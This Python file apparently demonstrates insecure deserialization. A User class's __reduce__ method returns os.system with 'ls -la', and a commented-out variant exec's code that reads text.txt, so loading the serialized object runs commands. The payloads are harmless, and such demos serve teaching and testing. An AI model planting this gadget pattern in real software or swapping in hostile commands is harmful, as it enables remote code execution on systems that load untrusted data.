import yaml
import builtins
import os

class User():
    def __init__(self, name, surname):
       self.name= name
       self.surname= surname

    def __str__(self):
        return "name : {}, surname: {}".format(self.name, self.surname)

    # def __reduce__(self):
    #         return (builtins.exec, ("with open('text.txt','r') as r: print(r.readlines())",))

    def __reduce__(self):
        return(os.system,("ls -la",))